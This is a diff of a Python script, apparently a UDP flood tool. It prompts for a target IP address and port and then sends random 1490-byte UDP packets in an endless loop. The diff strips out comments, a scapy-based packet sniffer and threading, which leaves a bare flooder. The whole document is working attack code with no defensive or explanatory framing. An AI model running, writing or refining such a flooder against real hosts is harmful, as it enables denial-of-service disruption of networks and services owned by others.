@@ -2,20 +2,16 @@ import socket
 import secrets
 import time
 from datetime import datetime
-from scapy.all import sniff, UDP
 
-# Function to get current time
 def get_current_time():
     now = datetime.now()
     return now.hour, now.minute, now.day, now.month, now.year
 
-# Function to create a UDP socket
 def create_socket():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     return sock
-
-# Function to get valid IP address from user
+    
 def get_target_ip():
     while True:
         ip = input("Enter target IP address: ")
@@ -24,7 +20,6 @@ def get_target_ip():
         else:
             print("Invalid input. Please enter a valid IP address.")
 
-# Function to get valid port number from user
 def get_target_port():
     while True:
         try:
@@ -36,13 +31,13 @@ def get_target_port():
         except ValueError:
             print("Invalid input. Please enter a valid port number.")
 
-# Main function to send packets
+
 def send_packets(ip, port, rate_limit):
     sock = create_socket()
     sent = 0
     try:
         while True:
-            # Generate random bytes
+        
             bytes_to_send = secrets.token_bytes(1490)
             sock.sendto(bytes_to_send, (ip, port))
             sent += 1
@@ -56,33 +51,10 @@ def send_packets(ip, port, rate_limit):
     finally:
         sock.close()
 
-# Packet callback function for sniffing
-def packet_callback(packet):
-    if UDP in packet:
-        print(f"Packet captured: {packet.summary()}")
-
-# Function to start sniffing
-def start_sniffing(interface=None):
-    print("Starting packet sniffing...")
-    # Sniff UDP packets
-    sniff(iface=interface, filter="udp", prn=packet_callback, store=0)
-
 if __name__ == "__main__":
-    # Get current time (optional)
     get_current_time()
-
-    # Get target IP and port for sending packets
     target_ip = get_target_ip()
     target_port = get_target_port()
+    rate_limit = 100  
 
-    # Set rate limit
-    rate_limit = 100  # packets per second
-
-    # Start sending packets in a separate thread
-    import threading
-    sender_thread = threading.Thread(target=send_packets, args=(target_ip, target_port, rate_limit))
-    sender_thread.start()
-
-    # Get network interface for sniffing
-    interface = input("Enter the network interface to sniff on (or leave blank for default): ").strip()
-    start_sniffing(interface)
+    send_packets(target_ip, target_port, rate_limit)
